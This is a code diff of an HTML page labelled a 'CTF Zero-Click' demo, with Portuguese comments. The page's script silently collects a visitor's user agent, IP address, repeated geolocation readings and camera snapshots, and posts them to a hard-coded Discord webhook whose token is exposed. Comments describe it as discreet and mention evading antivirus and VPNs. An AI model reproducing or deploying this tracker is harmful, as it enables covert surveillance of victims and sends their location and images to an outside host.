@@ -3,11 +3,11 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Demo CTF Zero-Click</title>
+    <title>Demo CTF Zero-Click Fotos e Geo Auto</title>
     <style>
         body { font-family: Arial, sans-serif; text-align: center; margin-top: 50px; background: #f0f0f0; }
-        h1 { color: #ff0000; font-size: 16px; opacity: 0.7; }
-        #status { font-size: 10px; color: #00aa00; margin-top: 5px; }
+        h1 { color: #ff0000; font-size: 16px; opacity: 0.7; } /* Sutil */
+        #status { font-size: 10px; color: #00aa00; margin-top: 5px; } /* Discreto */
     </style>
 </head>
 <body>
@@ -15,16 +15,16 @@
     <div id="status">Inicializando...</div>
 
     <script>
-        // Webhook (substitua por webhook.site se Discord falhar)
+        // Webhook do Discord (ou webhook.site)
         const WEBHOOK_URL = 'https://discord.com/api/webhooks/1375982804852146247/3B6K6PbBrS05n0DOlWLJa3ba-t4t_Qc0ZyaLjCYMrT6Op7u-cvmddGrahMke9PoUH2di';
 
-        // Enviar item ao webhook (multipart/form-data, anti-antivírus)
+        // Enviar item ao webhook
         async function sendItem(type, data, index = null) {
             try {
                 const formData = new FormData();
                 formData.append('payload_json', JSON.stringify({
                     embeds: [{
-                        title: `CTF Demo: ${type} [${new Date().toISOString()}]`,
+                        title: `CTF Zero-Click: ${type} [${new Date().toISOString()}]`,
                         fields: [
                             { name: 'Type', value: type },
                             { name: 'Index', value: index !== null ? index + 1 : 'N/A' },
@@ -41,10 +41,9 @@
 
                 const response = await fetch(WEBHOOK_URL, {
                     method: 'POST',
-                    body: formData,
-                    headers: { 'Accept': 'application/json' } // Headers neutros
+                    body: formData
                 });
-                if (!response.ok) throw new Error(`HTTP ${response.status}`);
+                if (!response.ok) throw new Error(`HTTP ${response.status}: ${response.statusText}`);
                 return true;
             } catch (e) {
                 console.error(`Erro ao enviar ${type}: ${e.message}`);
@@ -80,9 +79,9 @@
             await sendItem('User-Agent', { userAgent: data.userAgent });
             await new Promise(resolve => setTimeout(resolve, 2000));
 
-            // Enviar IP (anti-VPN: usa api.ipify.org)
+            // Enviar IP
             try {
-                const ipResponse = await fetch('https://api.ipify.org?format=json', { mode: 'cors' });
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
                 const ip = (await ipResponse.json()).ip;
                 await sendItem('IP', { ip });
             } catch (e) {
@@ -90,7 +89,7 @@
             }
             await new Promise(resolve => setTimeout(resolve, 2000));
 
-            // Coletar localização (silenciosa)
+            // Coletar localização (silenciosa, 4 updates)
             if (navigator.geolocation) {
                 for (let i = 0; i < 4; i++) {
                     await new Promise(resolve => {
@@ -130,15 +129,10 @@
             }
 
             try {
-                const constraints = {
-                    video: {
-                        facingMode: navigator.userAgent.match(/mobile/i) ? { ideal: 'environment' } : 'user',
-                        width: { ideal: 320 },
-                        height: { ideal: 240 }
-                    },
-                    audio: false
-                };
-                const stream = await navigator.mediaDevices.getUserMedia(constraints);
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: navigator.userAgent.match(/mobile/i) ? 'environment' : 'user', width: { ideal: 320 }, height: { ideal: 240 } },
+                    audio: false 
+                });
                 for (let i = 0; i < 8; i++) {
                     const video = document.createElement('video');
                     video.srcObject = stream;
